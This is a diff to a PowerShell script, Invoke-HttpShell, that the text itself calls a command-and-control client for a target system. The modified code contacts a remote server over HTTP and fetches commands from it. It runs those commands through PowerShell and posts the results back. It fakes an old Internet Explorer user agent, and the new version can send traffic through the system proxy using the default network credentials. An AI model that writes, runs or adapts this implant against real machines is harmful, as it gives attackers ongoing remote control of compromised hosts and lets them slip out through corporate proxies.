@@ -7,21 +7,26 @@ function Invoke-HttpShell
     HTTP-Shell powershell client.
 
 .Description
-    This script will connect to an Egress-assess server and transfer faux Personally Identifiable Information or
-    files from the target system.
-    Due to processing overhead in Powershell, numbers are created in batches of 5,000.
-    Reference: http://powershell.org/wp/2013/09/16/powershell-performance-the-operator-and-when-to-avoid-it/
+    This script will connect to a Shell-TTP server and provide command and control
+    capabilities from the target system.
 
-.Parameter SERVER
-    The string containing the server or hostname of the egress assess server
+.Parameter Server
+    The string containing the server or hostname of the shell-ttp server
 
-.Parameter PORT
+.Parameter Port
     The string containing the port to communicate over
+
+.Parameter Proxy
+    A switch to specify that you want to use a Proxy (default no proxy)
+
+.Parameter ProxyAddress
+    A string specifying a custom proxy to use (ex: http://testproxy.net:3128)
 
 .Example
     Import-Module HTTP-Shell.ps1
-    Invoke-HttpShell -SERVER 127.0.0.1 -PORT 80
-    Invoke-HttpShell -SERVER 127.0.0.1 -PORT 80 -UseProxy 'http://testproxy.com:80' -UA 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)'
+    Invoke-HttpShell -Server 127.0.0.1 -Port 80
+    Invoke-HttpShell -Server 127.0.0.1 -Port 80 -Proxy
+    Invoke-HttpShell -Server 127.0.0.1 -Port 80 -ProxyAddress 'http://testproxy.net:3128' -UserAgent 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)'
 
 #>
     [CmdletBinding()]
@@ -31,7 +36,9 @@ function Invoke-HttpShell
         [Parameter(Mandatory = $True)]
         [string]$Port,
         [Parameter(Mandatory = $False)]
-        [string]$UseProxy = $Null,
+        [switch]$Proxy = $False,
+        [Parameter(Mandatory = $False)]
+        [string]$ProxyAddress = $Null,
         [Parameter(Mandatory = $False)]
         [string]$UserAgent = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
     )
@@ -58,22 +65,28 @@ function Invoke-HttpShell
         $uri = "http://" + $Server + ":" + $Port + "/"
         $wc = New-Object -TypeName System.Net.WebClient
 
-        $wc.Headers.Add("User-Agent", $UserAgent)
-        $wc.Headers.Add("Content-type", "application/x-www-form-urlencoded")
-        $wc.Headers.Add("Accept", "text/plain")
-
-        if ($UseProxy) {
-            $proxy = New-Object -TypeName System.Net.WebProxy
-            $proxy.Address = $UseProxy
-            $proxy.UseDefaultCredentials = $True
-            $proxy.BypassProxyOnLocal = $False
-            $wc.proxy = $proxy
+        if ($Proxy) {
+          $newProxy = [System.Net.WebRequest]::GetSystemWebProxy()
+          $newProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+        } elseif ($ProxyAddress) {
+          $newProxy = New-Object -TypeName System.Net.WebProxy
+          $newProxy.Address = $ProxyAddress
+          $newProxy.UseDefaultCredentials = $True
+          $newProxy.BypassProxyOnLocal = $False
+        } else {
+          $newProxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()
         }
+
+        $wc.proxy = $newProxy
 
         $sleep = 2
 
         while ($True) {
+            $wc.Headers.Add("User-Agent", $UserAgent)
+            $wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+            $wc.Headers.Add("Accept", "text/plain")
             $command = $wc.DownloadString($uri)
+
             if ($command) {
                 if ($command -like "checkin") {
                     $results = "Checking in..."
@@ -85,6 +98,10 @@ function Invoke-HttpShell
                 } else {
                     $results = Execute-Powershell $command
                 }
+
+                $wc.Headers.Add("User-Agent", $UserAgent)
+                $wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+                $wc.Headers.Add("Accept", "text/plain")
                 $wc.UploadString($uri + "index.aspx", "POST", $results)
                 $command = $results = [string]::empty
             }
